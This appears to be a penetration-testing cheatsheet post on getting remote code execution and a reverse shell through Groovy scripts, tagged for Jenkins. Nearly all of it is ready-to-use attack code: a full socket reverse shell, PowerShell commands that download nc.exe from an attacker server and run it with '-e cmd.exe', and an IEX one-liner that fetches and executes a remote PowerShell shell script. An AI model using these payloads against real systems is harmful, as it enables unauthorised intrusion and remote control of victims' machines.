---
title: "Groovy Script — Remote Code Execution"
date: 2020-08-24 18:13:44 +/-0800
categories: [Cheatsheets,Scripts]
tags: [Remote Code Execution,Groovy,RCE,Jenkins]
image: /assets/img/Posts/groovy.jpg
---

> This cheatsheet describes various methods for executing remote code in Groovy Language to get an reverse shell. 

## Method 1:

```console
String host="10.10.14.25";
int port=1337;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Method 2:

#### Testing code execution

```console
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
#### Uploading nc on victim machine

```console
def process = "powershell -command Invoke-WebRequest 'http://10.10.14.11:8080/nc.exe' -OutFile nc.exe".execute();
println("${process.text}");
```

#### Executing nc to get reverse shell

```console
def process = "powershell -command ./nc.exe 10.10.14.11 9001 -e cmd.exe".execute();
println("${process.text}");
```

## Method 3:

```console
cmd = """ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/Invoke-PowerShellTcp.ps1') """
println cmd.execute().txt
```

